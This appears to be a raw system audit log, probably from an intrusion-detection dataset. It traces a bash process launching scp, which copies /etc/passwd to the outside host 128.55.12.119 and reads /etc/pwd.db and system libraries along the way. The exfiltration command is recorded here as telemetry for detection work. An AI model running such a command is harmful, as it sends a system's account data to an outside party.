1558013044.712:347798931,E0390F6B-77DD-11E9-B129-6C2B597E484C:bash,FORK,E05C5959-77DD-11E9-B129-6C2B597E484C,null
1558013044.712:347798932,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,EXECUTE,0,scp -r /etc/passwd admin@128.55.12.119:./files/
1558013044.712:347798933,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,908C1871-9556-355C-9695-1D084C35A52A,/etc/libmap.conf
1558013044.712:347798934,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,908C1871-9556-355C-9695-1D084C35A52A,/etc/libmap.conf
1558013044.712:347798936,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,A7C0B6CE-C649-5C51-89C6-9308515CF876,/var/run/ld-elf.so.hints
1558013044.712:347798937,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,A7C0B6CE-C649-5C51-89C6-9308515CF876,/var/run/ld-elf.so.hints
1558013044.712:347798938,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,A7C0B6CE-C649-5C51-89C6-9308515CF876,/var/run/ld-elf.so.hints
1558013044.712:347798940,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,403C38D2-1E20-5058-A01E-5AD9B850311F,/usr/lib/libprivatessh.so.5
1558013044.712:347798950,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,680AFF23-5240-8954-8052-DB7044890360,/lib/libc.so.7
1558013044.712:347798960,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,BC36EE8E-0BE3-DE50-A30B-67ADE0DECCE1,/usr/lib/libprivateldns.so.5
1558013044.712:347798970,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,B1E1F342-C4A9-8950-A9C4-792D4089BF48,/lib/libcrypto.so.111
1558013044.712:347798980,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,72F1B0DA-370B-B850-8B37-097B90B864E6,/lib/libcrypt.so.5
1558013044.712:347798990,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,91258993-B942-C35D-82B9-25794DC34401,/lib/libz.so.6
1558013044.712:347799000,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,A9331079-AB10-8656-90AB-7E5E76860DF4,/usr/lib/libssl.so.111
1558013044.712:347799010,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,DBE56166-8DF5-D156-B58D-41C346D11FAC,/lib/libthr.so.3
1558013044.712:347799028,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,F410BE96-4C0C-765E-8C4C-6F0E2E760020,/dev/hpet0
1558013044.712:347799034,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,1633500B-D34B-8058-8BD3-ABB7D880915E,/dev/null
1558013044.712:347799036,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,816E6A3D-1172-585C-B211-BC4D3C585A59,/etc/nsswitch.conf
1558013044.712:347799037,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,816E6A3D-1172-585C-B211-BC4D3C585A59,/etc/nsswitch.conf
1558013044.712:347799038,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,816E6A3D-1172-585C-B211-BC4D3C585A59,/etc/nsswitch.conf
1558013044.712:347799040,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db
1558013044.712:347799041,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db
1558013044.712:347799042,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db
1558013044.712:347799043,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db
1558013044.712:347799044,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db
1558013044.712:347799045,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db
1558013044.712:347799046,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db
1558013044.712:347799047,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db
1558013044.712:347799048,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db
1558013044.712:347799049,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,0A6725DF-089C-8051-9C08-E2F211807F26,/etc/pwd.db
1558013044.712:347799056,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,FORK,E05D85F5-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347800927,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347800928,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,OPEN,BB0BC4FC-5600-F75D-8056-9E3E6DF7615F,/etc/passwd
1558013050.392:347801214,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801215,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801216,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
1558013050.392:347801217,E05C5959-77DD-11E9-B129-6C2B597E484C:scp,READ,E05D7CB2-77DD-11E9-B129-6C2B597E484C,null
